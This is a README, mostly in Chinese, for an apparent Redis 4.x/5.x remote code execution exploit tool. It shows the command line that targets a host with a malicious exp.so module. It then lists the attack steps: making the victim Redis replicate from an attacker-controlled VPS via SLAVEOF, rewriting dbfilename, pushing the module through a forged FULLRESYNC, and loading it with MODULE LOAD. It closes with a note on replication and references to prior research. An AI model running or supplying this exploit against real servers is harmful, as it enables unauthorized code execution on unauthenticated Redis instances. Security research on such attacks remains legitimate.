# redis-rce
Redis 4.x/5.x RCE  
inspired by Redis [post-exploitation](https://github.com/tom0li/collection-document/blob/master/15-redis-post-exploitation.pdf).

### 0x00 复现
前提需要未授权  
Compile exp.so from https://github.com/RicterZ/RedisModules-ExecuteCommand.  
运行Ridter的  
```
python redis-rce.py -r 192.168.52.139 -L 192.168.52.139 -P 21001 -f exp.so  
```
![](https://github.com/tom0li/redis-rce/blob/master/1.jpg?raw=true)
![](https://github.com/tom0li/redis-rce/blob/master/2.jpg?raw=true)

### 0x01 过程
将redis设置为我们的slave(可以理解为随从)  
```
SLAVEOF vps可控 port  
```
设置redis的数据库文件  
```
CONFIG SET dbfilename exp.so  
```
同步写入so  
```
+FULLRESYNC <Z*40> 1\r\n$<len>\r\n<payload>  
```
加载模块  
```
MODULE LOAD ./exp.so  
```
### 0x02 Redis主从复制
集群，一个作为主(master)，其余作为从(slave)，master只负责写，slave负责读，缓解master流量压力。  
主从数据相同，slave类似备份机。通过设置可以数据同步。  

### 0x03 优点
1.模块化,兼容性高  
2.无脏数据  

### 参考
```
https://xz.aliyun.com/t/5616
https://paper.seebug.org/975/
https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
https://www.cnblogs.com/iamstudy/articles/redis_load_module_rce.html
https://github.com/Ridter/redis-rce
```
